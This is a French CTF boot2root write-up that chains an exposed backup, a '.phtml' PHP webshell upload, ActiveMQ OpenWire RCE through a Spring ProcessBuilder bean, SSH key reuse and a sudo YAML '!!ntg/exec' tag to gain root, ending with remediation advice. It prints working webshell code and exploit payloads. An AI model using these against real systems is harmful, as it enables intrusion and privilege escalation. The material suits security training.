# Niamtougou Cloud — webshell, ActiveMQ OpenWire, puis un YAML qui exécute

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/niamtougou-cloud/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Un tarball de sauvegarde me donne les identifiants du panneau. Le
> filtre d'upload bloque `.php` mais pas `.phtml`, donc je dépose un webshell. De
> là, un ActiveMQ en écoute locale (OpenWire) me donne du RCE Java via un bean
> Spring `ProcessBuilder`. Je récupère la clé SSH d'`activemq` pour sauter sur
> `ntg-ops`, qui peut lancer `ntg_backup.py` en `sudo` — et ce script charge du
> YAML avec un tag maison `!!ntg/exec` qui exécute des commandes. Une tâche YAML
> plus tard, je suis root. **Flag :** `/root/root.txt` → `NCTF{…}`.

## 1. Briefing

Boot2root de la finale, thème « cloud d'impression ». Un seul flag root, au bout
d'une chaîne à quatre pivots.

| Champ | Valeur |
|-------|--------|
| Cible | lab éphémère (`http://HOST:PORT`) |
| Pile | panneau web, ActiveMQ, SSH interne |
| Flag | `NCTF{...}` |

## 2. Reconnaissance & foothold

Un tarball de sauvegarde exposé me livre les identifiants du panneau. Une fois
connecté, il y a un upload — qui refuse `.php`. Classique : j'essaie les
extensions alternatives, et `.phtml` passe.

```php
<?php if(isset($_REQUEST['c'])){echo shell_exec($_REQUEST['c']);} ?>
```

```bash
curl 'http://HOST/uploads/shell.phtml?c=id'
# uid=33(www-data)
```

## 3. Analyse

Depuis `www-data`, je regarde ce qui tourne en local. ActiveMQ écoute son port
OpenWire sur la boucle locale. OpenWire désérialise des objets Java, et la
version exposée accepte une charge qui instancie un bean Spring : c'est le
chemin `ProcessBuilder` bien connu, donc une exécution de commande en tant que
l'utilisateur `activemq`.

## 4. Exploitation

### Étape 1 — RCE via OpenWire (bean Spring ProcessBuilder)

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/sh</value><value>-c</value>
        <value><![CDATA[ <ma commande> ]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

Le message OpenWire pointe ce XML, ActiveMQ l'instancie, `ProcessBuilder.start()`
lance ma commande en `activemq`.

### Étape 2 — activemq → ntg-ops (clé SSH)

`activemq` garde une clé privée dans `~/.ssh/id_rsa` qui ouvre le compte
`ntg-ops` en local :

```bash
ssh -i /home/activemq/.ssh/id_rsa ntg-ops@127.0.0.1
```

### Étape 3 — ntg-ops → root (YAML `!!ntg/exec`)

`ntg-ops` peut lancer un script de sauvegarde en root :

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /usr/local/bin/ntg_backup.py <fichier.yml>
```

`ntg_backup.py` parse le YAML avec un **constructeur personnalisé** `!!ntg/exec`
qui exécute la valeur comme une commande shell. Je fabrique une tâche :

```yaml
!!ntg/exec "cat /root/root.txt > /var/www/html/uploads/root.flag && chmod 644 /var/www/html/uploads/root.flag"
```

```bash
echo "$YAML" > /var/backups/ntg/jobs/pwn.yml
sudo /usr/bin/python3 /usr/local/bin/ntg_backup.py /var/backups/ntg/jobs/pwn.yml
```

Le script exécute mon tag en root et dépose le flag là où je peux le lire.

## 5. Flag

```text
NCTF{…}
```

## 6. Impasses & troubleshooting

- **`.php` bloqué** : ne pas abandonner l'upload, tester `.phtml`, `.php5`,
  `.pht`… ici `.phtml` suffit.
- **OpenWire local** : le port n'est pas exposé à distance ; il faut d'abord le
  webshell pour parler à ActiveMQ en `127.0.0.1`.
- **Le tag YAML** : sans le constructeur maison `!!ntg/exec`, un `yaml.safe_load`
  l'aurait rejeté — c'est tout l'intérêt de lire le code du script.

## 7. Leçons & remédiation

- **Liste blanche d'extensions**, pas liste noire ; et traiter les uploads comme
  des données, jamais servis comme du code.
- **ActiveMQ** : désactiver OpenWire si inutile, filtrer les classes
  désérialisables, mettre à jour.
- **Clés SSH** : une clé privée lisible par un service est un pivot direct ;
  compte dédié, clé chiffrée, ou certificats courts.
- **Constructeurs YAML personnalisés = exécution** : ne jamais exposer un
  `!!exec` maison dans un script lancé en sudo. Charger en `safe_load` et traiter
  les tâches comme des données inertes.

## 8. Annexe — chaîne résumée

```text
tarball → creds panel → upload .phtml (webshell www-data)
   → ActiveMQ OpenWire (bean Spring ProcessBuilder) → activemq
   → ssh id_rsa → ntg-ops → sudo ntg_backup.py + !!ntg/exec → root
```
